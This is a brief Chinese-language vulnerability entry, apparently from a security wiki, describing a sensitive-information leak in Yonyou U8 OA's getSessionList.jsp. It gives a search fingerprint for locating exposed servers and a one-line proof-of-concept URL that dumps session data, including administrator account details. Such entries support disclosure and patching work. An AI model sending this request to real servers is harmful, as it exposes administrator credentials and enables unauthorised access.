# 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞

## 漏洞描述

用友 U8 OA getSessionList.jsp文件，通过漏洞攻击者可以获取数据库中管理员的账户信息

## 漏洞影响

<a-checkbox checked>用友 U8 OA</a-checkbox></br>

## 网络测绘

<a-checkbox checked>"用友U8-OA"</a-checkbox></br>

## 漏洞复现

登录页面

![img](../../../.vuepress/public/img/1645976459870-e87ed43e-2b7e-432d-b0ca-4909d02748be.png)

验证POC

```javascript
/yyoa/ext/https/getSessionList.jsp?cmd=getAll
```

![img](../../../.vuepress/public/img/1645976484402-84e294eb-dd29-4cfa-b8d7-d7ce7b07a7ce.png)